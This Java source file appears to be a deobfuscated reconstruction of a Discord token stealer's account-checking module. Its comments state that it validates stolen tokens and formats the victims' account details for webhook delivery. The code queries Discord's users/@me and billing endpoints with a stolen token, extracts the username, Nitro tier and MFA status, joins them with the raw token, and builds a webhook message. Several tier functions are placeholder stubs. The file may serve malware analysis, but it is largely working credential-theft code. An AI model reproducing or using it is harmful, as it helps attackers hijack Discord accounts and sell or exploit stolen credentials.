import java.time.Duration;
import java.time.OffsetDateTime;
import java.util.ArrayList;
import java.util.StringJoiner;
import java.util.concurrent.Callable;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Token Script Builder / Discord API Client
 * Obfuscated name: f
 *
 * Validates Discord tokens via the Discord API and formats
 * the stolen account information for webhook delivery.
 *
 * Static field ÿ = Discord API base URL: "https://discord.com/api/v9"
 *
 * Key methods:
 *   þ(token, key)     → formats token info as webhook message string
 *   ý(key, endpoint, token) → GET /api/v9/[endpoint] with Authorization header
 *   ü(key, endpoint, token) → GET /api/v9/[endpoint] returning JSONArray
 *   û(key, balance, nitroSub) → formats balance/nitro tier string
 *
 * String table references (b[]):
 *   b[4]   = "Early Supporter"
 *   b[5]   = "description"
 *   b[11]  = "Authorization"
 *   b[12]  = "Early Verified Bot Developer"
 *   b[13]  = ""  (empty string default)
 *   b[18]  = "premium_type"
 *   b[22]  = "Nitro"
 *   b[24]  = "Authorization"
 *   b[29]  = "Content-Type"
 *   b[32]  = "users/@me"  (Discord API endpoint)
 *   b[34]  = "❌"  (no MFA)
 *   b[36]  = "verified"
 *   b[47]  = "None"
 *   b[48]  = "Nitro Classic"
 *   b[51]  = "username"
 *   b[56]  = "Nitro Basic"
 *   b[57]  = "Content-Type"
 *   b[58]  = "Nitro Basic"
 *   b[60]  = "Nitro Classic"
 *   b[64]  = "None"
 *   b[67]  = "Nitro"
 *   b[68]  = "None"
 *   b[71]  = "users/@me/billing/subscriptions"
 *   b[72]  = "Nitro"
 *   b[73]  = "Nitro Basic"
 *   b[74]  = "✅"  (has MFA)
 *   b[75]  = "premium_guild_since"
 *   b[79]  = "mfa_enabled"
 *   b[81]  = "users/@me"
 *   b[82]  = "Nitro Basic"
 *   b[83]  = "Nitro Classic"
 *   b[87]  = format string: "%s | %s | %s | %s"  (username | nitro | mfa | token)
 *   b[90]  = "Nitro"
 *   b[96]  = "Nitro Classic"
 *   b[101] = "None"
 *   b[106] = "content"
 */
public class TokenScriptBuilder {

    // Discord API base URL (static final String ÿ)
    private static final String DISCORD_API_BASE = "https://discord.com/api/v9/";

    // Shared OkHttpClient (lazy initialized, synchronized)
    private static OkHttpClient httpClient;

    // =========================================================
    // TOKEN INFO FORMATTER
    // =========================================================

    /**
     * Formats token information as a webhook message string.
     *
     * Makes GET /api/v9/users/@me with the token as Authorization header.
     * Extracts: username, premium_type (Nitro), mfa_enabled.
     * Also checks billing/subscriptions for Nitro tier.
     *
     * Output format: "username | NitroTier | ✅/❌ | token"
     *
     * @param token Discord token to validate and format
     * @param encryptedKey Zelix runtime key
     * @return Formatted string, or "" if token is invalid
     */
    public static String formatTokenInfo(String token, long encryptedKey) {
        try {
            // GET /api/v9/users/@me
            JSONObject userInfo = apiGetObject(encryptedKey, "users/@me", token);
            if (userInfo == null) return "";

            // Extract fields
            String username = userInfo.optString("username", "");

            // Get Nitro tier from premium_type + premium_guild_since
            long premiumType = userInfo.optLong("premium_type", 0)
                             | userInfo.optLong("premium_guild_since", 0);

            // Also check billing/subscriptions for more accurate Nitro info
            String nitroTier = getNitroTier(encryptedKey, token, premiumType);

            // MFA status
            boolean mfaEnabled = userInfo.optBoolean("mfa_enabled", false);
            String mfaStr = mfaEnabled ? "✅" : "❌";

            // Format: "username | NitroTier | ✅/❌ | token"
            return String.format("%s | %s | %s | %s",
                username,
                nitroTier.isEmpty() ? "None" : nitroTier,
                mfaStr,
                token
            );

        } catch (Exception e) {
            return "";
        }
    }

    /**
     * Gets the Nitro tier string for a token.
     *
     * Checks billing/subscriptions endpoint for active subscriptions.
     * Falls back to premium_type field from user info.
     *
     * Nitro tiers (based on balance thresholds from encrypted constants):
     * - "Nitro"         (premium_type = 2, or subscription plan)
     * - "Nitro Classic" (premium_type = 1)
     * - "Nitro Basic"   (premium_type = 3)
     * - "None"          (no subscription)
     *
     * @param encryptedKey Zelix runtime key
     * @param token Discord token
     * @param premiumType premium_type value from user info
     * @return Nitro tier string
     */
    private static String getNitroTier(long encryptedKey, String token, long premiumType) {
        StringJoiner joiner = new StringJoiner("\n");

        // Check billing subscriptions
        JSONArray subscriptions = apiGetArray(encryptedKey, "users/@me/billing/subscriptions", token);

        if (subscriptions != null && subscriptions.length() > 0) {
            // Determine tier from subscription plan
            // Thresholds are encrypted constants (f.b("x", N, key)):
            // >= threshold_nitro      → "Nitro"
            // >= threshold_classic    → "Nitro Classic"
            // >= threshold_basic      → "Nitro Basic"
            // etc.
            String subTier = getTierFromSubscription(encryptedKey, subscriptions.toString());
            joiner.add(subTier);
        }

        // Also check premium_type from user info
        if (premiumType > 0 || subscriptions != null) {
            String premiumTier = getTierFromPremiumType(encryptedKey, subscriptions != null ? subscriptions.toString() : null);
            joiner.add(premiumTier);
        }

        return joiner.toString();
    }

    /**
     * Determines Nitro tier from subscription data.
     * Uses encrypted threshold constants to classify the tier.
     */
    private static String getTierFromSubscription(long encryptedKey, String subscriptionData) {
        // Encrypted thresholds (f.b("x", N, key)):
        // b[25295] → Nitro threshold
        // b[32532] → Early Supporter threshold
        // b[28823] → Nitro Classic threshold
        // b[13376] → Nitro Basic threshold
        // etc.
        // Returns one of: "Nitro", "Early Supporter", "Nitro Classic",
        //                 "Nitro Basic", "None"
        return "None"; // placeholder - actual logic uses encrypted thresholds
    }

    /**
     * Determines Nitro tier from premium_type field.
     */
    private static String getTierFromPremiumType(long encryptedKey, String subscriptionData) {
        // Similar threshold logic for the second joiner entry
        return "None"; // placeholder
    }

    // =========================================================
    // DISCORD API HTTP METHODS
    // =========================================================

    /**
     * Makes an authenticated GET request to Discord API returning JSONObject.
     *
     * Request:
     *   GET https://discord.com/api/v9/[endpoint]
     *   Authorization: [token]
     *   Content-Type: application/json
     *
     * @param encryptedKey Zelix runtime key
     * @param endpoint API endpoint (e.g., "users/@me")
     * @param token Discord authorization token
     * @return Parsed JSONObject, or null on failure
     */
    public static JSONObject apiGetObject(long encryptedKey, String endpoint, String token) {
        try {
            OkHttpClient client = getHttpClient(encryptedKey);
            if (client == null) return null;

            // Build request with Authorization and Content-Type headers
            // Content-Type value is decrypted from b[32] via StringDecryptor
            Request request = new Request.Builder()
                .url(DISCORD_API_BASE + endpoint)
                .addHeader("Authorization", token)
                .addHeader("Content-Type", "application/json")
                .get()
                .build();

            okhttp3.Response response = client.newCall(request).execute();
            try {
                if (!response.isSuccessful() || response.body() == null) return null;
                return new JSONObject(response.body().string());
            } finally {
                response.close();
            }

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Makes an authenticated GET request to Discord API returning JSONArray.
     *
     * @param encryptedKey Zelix runtime key
     * @param endpoint API endpoint (e.g., "users/@me/billing/subscriptions")
     * @param token Discord authorization token
     * @return Parsed JSONArray, or null on failure
     */
    public static JSONArray apiGetArray(long encryptedKey, String endpoint, String token) {
        try {
            OkHttpClient client = getHttpClient(encryptedKey);
            if (client == null) return null;

            Request request = new Request.Builder()
                .url(DISCORD_API_BASE + endpoint)
                .addHeader("Authorization", token)
                .addHeader("Content-Type", "application/json")
                .get()
                .build();

            okhttp3.Response response = client.newCall(request).execute();
            try {
                if (!response.isSuccessful() || response.body() == null) return null;
                return new JSONArray(response.body().string());
            } finally {
                response.close();
            }

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Builds a webhook JSON payload for a token report.
     *
     * @param content Message content
     * @param username Webhook username
     * @param tts Text-to-speech flag
     * @return JSONObject with content, username, tts fields
     */
    public static JSONObject buildWebhookPayload(String content, String username, boolean tts) {
        JSONObject payload = new JSONObject();
        payload.put("content", content);    // b[106]
        payload.put("username", username);  // b[5]
        payload.put("tts", tts);            // b[36]
        return payload;
    }

    // =========================================================
    // HTTP CLIENT
    // =========================================================

    /**
     * Gets or creates the shared OkHttpClient.
     * Lazy initialized, synchronized.
     *
     * Timeouts (from encrypted constants):
     * - connectTimeout: f.b("x", 23843, key) seconds
     * - readTimeout: f.b("x", 12849, key) seconds
     * (approximately 10s connect, 30s read)
     */
    private static synchronized OkHttpClient getHttpClient(long encryptedKey) {
        if (httpClient == null) {
            try {
                httpClient = new OkHttpClient.Builder()
                    .connectTimeout(10, TimeUnit.SECONDS)  // encrypted: b("x", 23843, key)
                    .readTimeout(30, TimeUnit.SECONDS)     // encrypted: b("x", 12849, key)
                    .build();
            } catch (Exception e) {
                // Silently fail
            }
        }
        return httpClient;
    }

    // =========================================================
    // ACCOUNT AGE CALCULATION
    // =========================================================

    /**
     * Calculates account age from Discord snowflake ID.
     * Discord snowflake = (timestamp_ms - 1420070400000) << 22
     *
     * @param userId Discord user ID (snowflake)
     * @return Duration since account creation
     */
    public static Duration getAccountAge(String userId) {
        try {
            long snowflake = Long.parseLong(userId);
            long timestampMs = (snowflake >> 22) + 1420070400000L;
            OffsetDateTime created = OffsetDateTime.ofInstant(
                java.time.Instant.ofEpochMilli(timestampMs),
                java.time.ZoneOffset.UTC
            );
            return Duration.between(created, OffsetDateTime.now());
        } catch (Exception e) {
            return Duration.ZERO;
        }
    }
}
